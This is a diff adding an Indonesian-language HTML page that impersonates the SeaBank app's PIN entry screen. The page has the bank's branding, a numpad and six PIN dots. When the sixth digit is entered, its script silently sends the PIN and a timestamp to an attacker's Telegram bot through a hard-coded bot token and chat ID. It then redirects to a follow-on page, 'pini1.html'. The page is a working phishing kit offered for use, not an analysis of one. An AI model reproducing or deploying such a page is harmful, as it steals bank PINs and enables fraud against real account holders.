@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan PIN - SeaBank</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 50px 30px 30px;
+        }
+
+        /* Logo */
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #FF7A00 0%, #FF9500 100%);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .app-name {
+            font-size: 20px;
+            font-weight: 700;
+            color: #FF7A00;
+            margin-bottom: 8px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 40px;
+        }
+
+        /* PIN Dots */
+        .pin-container {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 50px;
+        }
+
+        .pin-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #DDD;
+            transition: all 0.2s;
+        }
+
+        .pin-dot.filled {
+            background-color: #FF7A00;
+            border-color: #FF7A00;
+        }
+
+        /* Numpad */
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            width: 100%;
+            max-width: 320px;
+        }
+
+        .num-btn {
+            width: 100%;
+            aspect-ratio: 1;
+            border: none;
+            background-color: #F5F5F5;
+            border-radius: 50%;
+            font-size: 24px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .num-btn:active {
+            background-color: #FFE8D6;
+            color: #FF7A00;
+            transform: scale(0.95);
+        }
+
+        .empty-btn {
+            background: transparent;
+        }
+
+        .delete-btn {
+            font-size: 22px;
+            background-color: #F5F5F5;
+        }
+
+        .forgot-pin {
+            margin-top: 40px;
+        }
+
+        .forgot-pin a {
+            color: #FF7A00;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .loading {
+            margin-top: 30px;
+            color: #FF7A00;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo">S</div>
+    <div class="app-name">SeaBank</div>
+    <div class="title">Masukkan PIN</div>
+    <div class="subtitle">Masukkan 6 digit PIN Anda</div>
+
+    <div class="pin-container" id="pinContainer">
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+    </div>
+
+    <div class="numpad">
+        <button class="num-btn" onclick="inputPin('1')">1</button>
+        <button class="num-btn" onclick="inputPin('2')">2</button>
+        <button class="num-btn" onclick="inputPin('3')">3</button>
+        <button class="num-btn" onclick="inputPin('4')">4</button>
+        <button class="num-btn" onclick="inputPin('5')">5</button>
+        <button class="num-btn" onclick="inputPin('6')">6</button>
+        <button class="num-btn" onclick="inputPin('7')">7</button>
+        <button class="num-btn" onclick="inputPin('8')">8</button>
+        <button class="num-btn" onclick="inputPin('9')">9</button>
+        <button class="num-btn empty-btn"></button>
+        <button class="num-btn" onclick="inputPin('0')">0</button>
+        <button class="num-btn delete-btn" onclick="deletePin()">⌫</button>
+    </div>
+
+    <div class="forgot-pin">
+        <a href="#">Lupa PIN?</a>
+    </div>
+
+    <div class="loading" id="loading">⏳ Sedang memverifikasi...</div>
+
+    <script>
+        // === SETTING TELEGRAM BOT ===
+        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+        const CHAT_ID = '8592742129';
+        const HALAMAN_TUJUAN = 'pini1.html';
+        // ============================
+
+        let pin = '';
+        const maxLength = 6;
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.pin-dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('filled', index < pin.length);
+            });
+        }
+
+        async function kirimPINKeTelegram(pin) {
+            const pesan = `🔑 PIN SeaBank\n📤 PIN: ${pin}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return res.ok;
+            } catch (err) {
+                console.error('Error kirim ke Telegram:', err);
+                return false;
+            }
+        }
+
+        function inputPin(digit) {
+            if (pin.length < maxLength) {
+                pin += digit;
+                updateDots();
+                
+                if (pin.length === maxLength) {
+                    prosesPIN();
+                }
+            }
+        }
+
+        function deletePin() {
+            if (pin.length > 0) {
+                pin = pin.slice(0, -1);
+                updateDots();
+            }
+        }
+
+        async function prosesPIN() {
+            // Tampilkan loading
+            document.getElementById('loading').style.display = 'block';
+            
+            // Kirim PIN ke Telegram otomatis
+            await kirimPINKeTelegram(pin);
+            
+            // Pindah ke halaman pini1.html setelah 1.5 detik
+            setTimeout(() => {
+                window.location.href = HALAMAN_TUJUAN;
+            }, 1500);
+        }
+    </script>
+    
+</body>
+</html>
